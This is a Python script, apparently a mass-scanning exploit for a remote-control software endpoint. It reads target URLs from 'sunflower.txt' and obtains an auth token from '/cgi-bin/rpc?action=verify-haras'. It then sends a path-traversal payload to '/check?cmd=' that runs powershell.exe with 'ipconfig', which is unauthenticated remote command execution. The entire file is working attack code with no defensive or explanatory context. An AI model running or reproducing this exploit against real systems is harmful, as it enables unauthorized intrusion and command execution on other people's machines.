import requests

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded"
    }


def Get_id(url,Cid):
    url+=Cid
    print(url)
    try:
        resp=requests.get(url=url,headers=headers,timeout=5)
        cid=resp.json()["verify_string"]
        print("【CID】"+cid)
        return cid
    except Exception as e:
         print("error")
    print(url)

def Get_cmd(url,payload,cid):
    headers["Cookies"]="CID="+cid
    url+=payload
    print(url)
    try:
        resp=requests.get(url=url,headers=headers,timeout=5)
        if resp.status_code==200:
            print("OK")
            print(resp.json())
    except Exception as e:
         print(e)
    
if __name__=="__main__":
    Cid="/cgi-bin/rpc?action=verify-haras"
    payload="/check?cmd=ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+ipconfig"

    with open("sunflower.txt","r") as f:
        for url in f:
            if "http://" not in url and "https://" not in url:
                        url="http://"+url
            id=Get_id(url=url,Cid=Cid)
            if id:
                Get_cmd(url=url,payload=payload,cid=id)
